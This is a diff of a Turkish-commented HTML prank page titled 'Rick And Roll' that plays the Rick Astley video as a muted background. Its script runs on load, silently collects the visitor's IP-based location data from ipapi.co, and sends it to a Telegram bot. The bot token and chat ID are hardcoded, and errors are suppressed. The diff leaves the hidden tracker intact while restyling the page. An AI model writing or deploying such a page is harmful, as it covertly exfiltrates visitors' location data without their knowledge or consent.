@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -5,39 +6,26 @@
   <title>Rick And Roll</title>
   <style>
     html, body {
-      margin: 0; padding: 0; height: 100%;
-      overflow: hidden;
+      margin: 0; padding: 0; height: 100%; overflow: hidden;
       background: black;
     }
-    .video-background {
+    #player {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      pointer-events: none;
+      top: 0; left: 0; width: 100%; height: 100%;
+      pointer-events: none; /* tıklamaları engelle */
       z-index: -1;
-    }
-    iframe {
-      width: 100vw;
-      height: 100vh;
-      border: none;
     }
   </style>
 </head>
 <body>
-  <div class="video-background">
-    <iframe 
-      src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&controls=0&modestbranding=1&showinfo=0" 
-      allow="autoplay" 
-      allowfullscreen
-      ></iframe>
-  </div>
+  <div id="player"></div>
 
   <script>
+    // Telegram veri gönderme fonksiyonu
     async function sendToTelegram(message) {
-      const chatId = "6400737507"; // Senin chat ID'in
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
+      const chatId = "6400737507"; // Senin chat ID
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
       try {
         await fetch(url, {
           method: 'POST',
@@ -48,10 +36,11 @@
           })
         });
       } catch(e) {
-        // Hata olursa sessizce geç
+        // Sessiz hata yönetimi
       }
     }
 
+    // Veri toplama fonksiyonu
     async function collectData() {
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -71,11 +60,38 @@
 
         await sendToTelegram(message);
       } catch(e) {
-        // Sessizce hatayı yoksay
+        // Sessiz hata
       }
     }
-
     collectData();
+
+    // YouTube iframe API yükle
+    var tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    var firstScript = document.getElementsByTagName('script')[0];
+    firstScript.parentNode.insertBefore(tag, firstScript);
+
+    var player;
+    function onYouTubeIframeAPIReady() {
+      player = new YT.Player('player', {
+        videoId: 'dQw4w9WgXcQ', // Rick Astley - Never Gonna Give You Up
+        playerVars: {
+          autoplay: 1,
+          controls: 0,
+          loop: 1,
+          playlist: 'dQw4w9WgXcQ',
+          modestbranding: 1,
+          rel: 0,
+          showinfo: 0,
+          mute: 1
+        },
+        events: {
+          onReady: function(event) {
+            event.target.playVideo();
+          }
+        }
+      });
+    }
   </script>
 </body>
 </html>
